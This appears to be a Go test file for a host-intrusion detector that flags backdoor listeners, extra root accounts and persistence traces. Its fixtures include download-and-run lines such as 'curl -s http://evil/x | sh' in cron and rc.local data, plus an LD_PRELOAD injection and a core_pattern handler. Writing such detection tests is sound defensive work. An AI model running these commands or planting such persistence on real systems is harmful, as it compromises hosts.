package probe

import (
	"strings"
	"testing"
)

// 机制 1：安全事实归属判定（JudgeSecurityFacts）——任何端口/账号/大文件
// 被同一归属机制覆盖，不针对具体形态。

// factsMetric 构造带安全事实 Raw 的 HostMetric。
func factsMetric(host string, listen, units, uid0, big string) HostMetric {
	hm := HostMetric{Host: host, Metrics: map[string]map[string]float64{}, Raw: map[string]string{}}
	if listen != "" {
		hm.Raw["listen_ports"] = listen
	}
	if units != "" {
		hm.Raw["svc_units"] = units
	}
	if uid0 != "" {
		hm.Raw["uid0_users"] = uid0
	}
	if big != "" {
		hm.Raw["big_files"] = big
	}
	return hm
}

const (
	// 正常监听：22 sshd、80 nginx、6379 redis-server。
	normalListen = `LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=200,fd=3))
LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=300,fd=10))
LISTEN 0      511        127.0.0.1:6379      0.0.0.0:*    users:(("redis-server",pid=400,fd=7))
`
	normalUnits    = "sshd.service\nnginx.service\nredis.service\ncrond.service\n"
	backdoorListen = `LISTEN 0      5            0.0.0.0:4444      0.0.0.0:*    users:(("python3",pid=123,fd=3))
`
)

// TestJudgeSecurityFacts_UnattributedListen 无法归属的监听端口 → 线索
// （任何后门端口被同一机制覆盖，与端口号无关）。
func TestJudgeSecurityFacts_UnattributedListen(t *testing.T) {
	hm := factsMetric("web-01", normalListen+backdoorListen, normalUnits, "", "")
	got := JudgeSecurityFacts(&hm)
	var hits []Anomaly
	for _, a := range got {
		if a.Metric == "listen_ports" {
			hits = append(hits, a)
		}
	}
	if len(hits) != 1 {
		t.Fatalf("应只对 4444 产一条监听线索: %+v", hits)
	}
	if hits[0].Signal() != "unattributed_listen" || hits[0].Key != "0.0.0.0:4444" {
		t.Errorf("线索应指向无法归属的端口: %+v", hits[0])
	}
	if !strings.Contains(hits[0].Desc, "python3") {
		t.Errorf("线索应含进程名: %q", hits[0].Desc)
	}
}

// TestJudgeSecurityFacts_AttributablePasses 已知服务端口不产线。
func TestJudgeSecurityFacts_AttributablePasses(t *testing.T) {
	hm := factsMetric("web-01", normalListen, normalUnits, "", "")
	got := JudgeSecurityFacts(&hm)
	for _, a := range got {
		if a.Metric == "listen_ports" {
			t.Errorf("已知服务端口不应产线: %+v", a)
		}
	}
}

// TestJudgeSecurityFacts_NoUnitsSkips 无单元清单（无 systemd/采集失败）时
// 监听归属规则跳过（保守不误报），数据仍进上下文。
func TestJudgeSecurityFacts_NoUnitsSkips(t *testing.T) {
	hm := factsMetric("web-01", backdoorListen, "", "", "")
	got := JudgeSecurityFacts(&hm)
	for _, a := range got {
		if a.Metric == "listen_ports" {
			t.Errorf("无归属依据不应产监听线: %+v", a)
		}
	}
}

// TestJudgeSecurityFacts_AbnormalUID0 uid=0 非 root 用户 → 线索；
// 仅 root 不产线。
func TestJudgeSecurityFacts_AbnormalUID0(t *testing.T) {
	hm := factsMetric("web-01", "", "", "root:/bin/bash\nbackdoor:/bin/bash\n", "")
	got := JudgeSecurityFacts(&hm)
	var hits []Anomaly
	for _, a := range got {
		if a.Metric == "uid0_users" {
			hits = append(hits, a)
		}
	}
	if len(hits) != 1 || hits[0].Signal() != "abnormal_uid0" || hits[0].Key != "backdoor" {
		t.Fatalf("应只对 backdoor 产 uid=0 线索: %+v", hits)
	}
	hm2 := factsMetric("web-01", "", "", "root:/bin/bash\n", "")
	if got := JudgeSecurityFacts(&hm2); len(got) != 0 {
		t.Errorf("仅 root 不应产线: %+v", got)
	}
}

// TestJudgeSecurityFacts_OversizedFile 超阈值大文件 → 线索（通用水位，
// 与具体路径无关）。
func TestJudgeSecurityFacts_OversizedFile(t *testing.T) {
	hm := factsMetric("web-01", "", "", "", "1572864000 /var/log/app.log\n")
	got := JudgeSecurityFacts(&hm)
	var hits []Anomaly
	for _, a := range got {
		if a.Metric == "big_files" {
			hits = append(hits, a)
		}
	}
	if len(hits) != 1 || hits[0].Signal() != "oversized_file" || hits[0].Key != "/var/log/app.log" {
		t.Fatalf("应产出大文件线索: %+v", hits)
	}
}

// TestJudgeSecurityFacts_ToFinding 归属线索经 ToFinding 落 pending，
// 带 L0 来源标记（merge 复发重置的证据链依据）。
func TestJudgeSecurityFacts_ToFinding(t *testing.T) {
	hm := factsMetric("web-01", backdoorListen, normalUnits, "root:/bin/bash\nbackdoor:/bin/bash\n", "")
	for _, a := range JudgeSecurityFacts(&hm) {
		f := a.ToFinding()
		if f.Status != FindingPending {
			t.Errorf("L0 线索应为 pending: %+v", f)
		}
		if f.Source != SourceL0 {
			t.Errorf("L0 线索应标记来源: %+v", f)
		}
	}
}

// TestJudgeSecurityFacts_ExtendedTraces 扩展痕迹规则（挂载掩盖/内核参数/
// 临时目录洪泛/shell 启动文件注入）：数据驱动，无对应数据段即跳过。
func TestJudgeSecurityFacts_ExtendedTraces(t *testing.T) {
	hm := factsMetric("web-01", "", "", "", "")
	// 非容器根（设备根）——容器内运行时 tmpfs 已按环境感知豁免
	// （TestJudgeSecurityFacts_ContainerTmpfsExempt 覆盖豁免路径）。
	hm.Raw["mounts"] = "/dev/sda1 / ext4\ntmpfs /var/log/nginx tmpfs\nproc /proc proc"
	hm.Raw["sysctl_keys"] = "net.ipv4.ip_forward = 0\nkernel.core_pattern = |/tmp/.x-handler %p %u"
	hm.Raw["tmp_dirs"] = "/dev/shm/.junk 50000\n/var/tmp 3000"
	hm.Raw["shell_init_hooks"] = "/etc/profile\n/root/.bashrc"
	hm.Raw["file_caps"] = "/usr/bin/ping cap_net_raw=ep\n/usr/bin/python3 cap_net_raw+ep"
	got := JudgeSecurityFacts(&hm)
	count := map[string]int{}
	for _, a := range got {
		count[a.Metric]++
	}
	want := map[string]int{"mounts": 1, "sysctl_keys": 1, "tmp_dirs": 2, "shell_init_hooks": 2, "file_caps": 2}
	for m, n := range want {
		if count[m] != n {
			t.Errorf("%s 线索数 = %d, want %d（全部: %+v）", m, count[m], n, got)
		}
	}
	// 干净环境不产线（/tmp 与 /dev/shm 是 systemd 容器标准 tmpfs，
	// /etc 下的 resolv/hosts 是 docker 标准 bind 挂载，均不在掩盖判定
	// 清单内；默认内核参数不误报）。
	clean := factsMetric("web-01", "", "", "", "")
	clean.Raw["mounts"] = "overlay / overlay\nproc /proc proc\ntmpfs /tmp tmpfs\ntmpfs /dev/shm tmpfs\ntmpfs /run tmpfs\n/dev/sdc /etc/resolv.conf ext4\n/dev/sdc /etc/hosts ext4"
	clean.Raw["sysctl_keys"] = "net.ipv4.ip_forward = 0\nkernel.core_pattern = core"
	if got := JudgeSecurityFacts(&clean); len(got) != 0 {
		t.Errorf("干净环境不应产线: %+v", got)
	}
}

// TestJudgeSecurityFacts_ContainerTmpfsExempt 容器运行时 tmpfs 豁免
// （P0 修复）：overlay 根 + 标准目录下的 tmpfs 挂载是容器运行时常态
// （docker --tmpfs），不得当"挂载掩盖"驱动模型去 umount 日志挂载点
// （chaos-r1 实测误处置）；bind 挂载不豁免（攻击者掩盖在任何形态下
// 都是线索）。
func TestJudgeSecurityFacts_ContainerTmpfsExempt(t *testing.T) {
	hm := factsMetric("web-01", "", "", "", "")
	hm.Raw["mounts"] = "overlay / overlay\ntmpfs /var/log/orderapp tmpfs\nproc /proc proc\n/tmp /var/log/evil tmpfs"
	got := JudgeSecurityFacts(&hm)
	count := map[string]int{}
	for _, a := range got {
		count[a.Metric]++
	}
	// tmpfs /var/log/orderapp 豁免；/tmp → /var/log/evil bind 掩盖保留。
	if count["mounts"] != 1 {
		t.Errorf("容器 tmpfs 豁免后应只剩 1 条 bind 掩盖线索，got %d（全部: %+v）", count["mounts"], got)
	}
	if count["mounts"] == 1 {
		for _, a := range got {
			if a.Metric == "mounts" && a.Key == "/var/log/orderapp" {
				t.Errorf("容器运行时 tmpfs 不应产掩盖线索: %+v", a)
			}
		}
	}
}

// TestJudgeSecurityFacts_ExpandedProbes L0 覆盖扩展（轻/快/广）的归属
// 规则：UDP 监听面/用户计划任务/rc.local/全局环境变量/动态链接器配置。
// 规则是归属/阈值型——任何异常对象被同一机制覆盖，不针对具体形态。
func TestJudgeSecurityFacts_ExpandedProbes(t *testing.T) {
	hm := factsMetric("web-01", "", "", "", "")
	hm.Raw["svc_units"] = "sshd.service\nnginx.service\n"
	// UDP 监听：161 snmpd 与 5353 avahi 均无法归属到已知服务单元
	// （单元清单只有 sshd/nginx）→ 各产一条线索。
	hm.Raw["listen_udp"] = `UNCONN 0      0          0.0.0.0:161        0.0.0.0:*    users:(("snmpd",pid=500,fd=8))
UNCONN 0      0        0.0.0.0:5353      0.0.0.0:*    users:(("avahi-daemon",pid=600,fd=14))
`
	// 用户计划任务：管道执行注入（与 cron_chain 同一模式）。
	hm.Raw["user_crons"] = "*/5 * * * * /tmp/.x.sh\n0 3 * * * /usr/bin/curl -s http://evil/x | sh\n"
	// rc.local：下载执行/反连注入；注释与普通行不产线。
	hm.Raw["rc_local"] = "#!/bin/sh\n# touch /var/lock/subsys/local\n/usr/bin/curl -s http://evil/y | bash\n"
	// 全局环境变量：LD_PRELOAD 注入 + PATH 指向可写目录。
	hm.Raw["env_global"] = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nLD_PRELOAD=/tmp/.evil.so\n"
	// 动态链接器配置：标准库目录 + include 指令不产线；/var/tmp 产线。
	hm.Raw["ld_so_conf"] = "include /etc/ld.so.conf.d/*.conf\n/usr/local/lib\n/usr/lib/x86_64-linux-gnu\n/var/tmp/.lib\n"
	got := JudgeSecurityFacts(&hm)
	count := map[string]int{}
	for _, a := range got {
		count[a.Metric]++
	}
	want := map[string]int{
		"listen_udp": 2, // snmpd + avahi 均无法归属（161 无 snmpd.service 单元）
		"user_crons": 1, // 仅 curl|sh 管道行（/tmp/.x.sh 无管道不产线）
		"rc_local":   1, // curl|bash 行
		"env_global": 1, // LD_PRELOAD（PATH 为系统标准路径不产线）
		"ld_so_conf": 1, // /var/tmp/.lib 在白名单外
	}
	for m, n := range want {
		if count[m] != n {
			t.Errorf("%s 线索数 = %d, want %d（全部: %+v）", m, count[m], n, got)
		}
	}
	// 干净环境不产线：标准 UDP 服务可归属、无注入、标准库路径。
	clean := factsMetric("web-01", "", "", "", "")
	clean.Raw["svc_units"] = "sshd.service\navahi-daemon.service\n"
	clean.Raw["listen_udp"] = `UNCONN 0      0        0.0.0.0:5353      0.0.0.0:*    users:(("avahi-daemon",pid=600,fd=14))
`
	clean.Raw["user_crons"] = "*/5 * * * * /usr/local/bin/backup.sh\n"
	clean.Raw["rc_local"] = "#!/bin/sh\n# touch /var/lock/subsys/local\n"
	clean.Raw["env_global"] = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
	clean.Raw["ld_so_conf"] = "include /etc/ld.so.conf.d/*.conf\n/usr/local/lib\n"
	if got := JudgeSecurityFacts(&clean); len(got) != 0 {
		t.Errorf("干净环境不应产线: %+v", got)
	}
}

// TestJudgeSecurityFacts_ExpertProbes 专家知识面归属规则（第二轮扩展）：
// 混杂模式网卡/udev 注入/SELinux 关闭/immutable 关键文件。规则是
// 归属/阈值型，脏环境产线、干净环境静默。
func TestJudgeSecurityFacts_ExpertProbes(t *testing.T) {
	hm := factsMetric("web-01", "", "", "", "")
	hm.Raw["promisc_ifaces"] = "lo UNKNOWN 00:00:00:00:00:00 <LOOPBACK,UP,LOWER_UP>\n" +
		"eth0 UP 1a:2b:3c:4d:5e:6f <BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP>\n"
	hm.Raw["udev_rules"] = "# 注释行\nKERNEL==\"sda\", RUN+=\"/bin/true\"\nKERNEL==\"sdb\", RUN+=\"/tmp/.x.sh\"\n"
	hm.Raw["selinux_status"] = "Permissive\n"
	hm.Raw["immutable_files"] = "----i---------e-- /etc/passwd\n---------------- /etc/hosts\n"
	got := JudgeSecurityFacts(&hm)
	count := map[string]int{}
	for _, a := range got {
		count[a.Metric]++
	}
	want := map[string]int{
		"promisc_ifaces":  1, // 仅 eth0（lo 无 PROMISC）
		"udev_rules":      1, // RUN+="/tmp/.x.sh"（/bin/true 与注释不产线）
		"selinux_status":  1, // Permissive
		"immutable_files": 1, // 仅 /etc/passwd 带 i（/etc/hosts 无属性）
	}
	for m, n := range want {
		if count[m] != n {
			t.Errorf("%s 线索数 = %d, want %d（全部: %+v）", m, count[m], n, got)
		}
	}
	// 干净环境不产线：无混杂模式、udev 规则无注入、SELinux Enforcing、
	// 无 immutable 位。
	clean := factsMetric("web-01", "", "", "", "")
	clean.Raw["promisc_ifaces"] = "eth0 UP 1a:2b:3c:4d:5e:6f <BROADCAST,MULTICAST,UP,LOWER_UP>\n"
	clean.Raw["udev_rules"] = "KERNEL==\"sda\", RUN+=\"/bin/true\"\n"
	clean.Raw["selinux_status"] = "Enforcing\n"
	clean.Raw["immutable_files"] = "---------------- /etc/passwd\n"
	if got := JudgeSecurityFacts(&clean); len(got) != 0 {
		t.Errorf("干净环境不应产线: %+v", got)
	}
}

// TestJudge_SvcInactive 启用但未运行的服务 → svc_inactive 线索（运行态
// 对照：停服类故障不越 failed 阈值，靠该对照确定性检出）。
func TestJudge_SvcInactive(t *testing.T) {
	hm := HostMetric{Host: "web-01", Metrics: map[string]map[string]float64{
		"svc_inactive": {"count": 1},
	}}
	got := Judge(&Snapshot{Hosts: []HostMetric{hm}}, DefaultThresholds())
	found := false
	for _, a := range got {
		if a.Signal() == "svc_inactive" {
			found = true
		}
	}
	if !found {
		t.Fatalf("应产出 svc_inactive 线索: %+v", got)
	}
}
